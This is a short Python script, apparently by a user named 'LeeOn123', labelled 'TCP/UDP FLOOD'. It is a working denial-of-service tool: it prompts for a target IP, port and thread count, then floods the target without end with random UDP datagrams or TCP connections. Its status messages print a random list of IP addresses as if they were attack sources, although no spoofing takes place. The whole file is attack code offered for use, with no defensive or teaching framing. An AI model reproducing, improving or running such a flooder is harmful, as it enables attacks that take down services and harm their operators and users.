#!/usr/bin/env python3
#Code by LeeOn123
import random
import socket
import threading

print("TCP/UDP FLOOD")
ip = str(input(" Ip:"))
port = int(input(" Port:"))
choice = str(input(" UDP(1/2):"))
times = int(input(" Packets:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("194.88.94.72","73.162.141.36","206.173.31.28","197.43.4.158","132.99.104.166","113.23.8.204","4.194.63.52","10.9.87.152","241.156.118.171","225.136.79.153","119.18.220.253","24.32.247.214","244.60.92.160","16.122.87.124","227.113.215.132","23.166.26.116","62.166.221.255","182.34.125.238","221.228.145.230","115.212.243.1","28.222.154.148","115.168.151.89","114.34.243.18","84.183.134.15","207.91.37.114","207.201.226.55","93.219.216.49","49.111.227.7","199.91.193.170"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" --------------------> Attack to 199.91.193.170:50034 ")
		except:
			print("[!] Error")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Sent!!!")
		except:
			s.close()
			print("[*] Error")

for y in range(threads):
	if choice == '1':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()